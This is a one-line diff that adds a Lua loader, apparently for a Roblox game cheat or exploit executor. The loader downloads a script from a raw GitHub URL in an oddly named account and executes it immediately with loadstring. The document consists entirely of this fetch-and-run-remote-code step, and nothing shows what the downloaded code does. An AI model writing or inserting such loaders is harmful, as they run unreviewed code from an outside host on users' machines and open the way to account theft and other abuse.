@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/map-southern-mudding-offroading-spam7-lg8h8g3tob8wp9.lua"))()
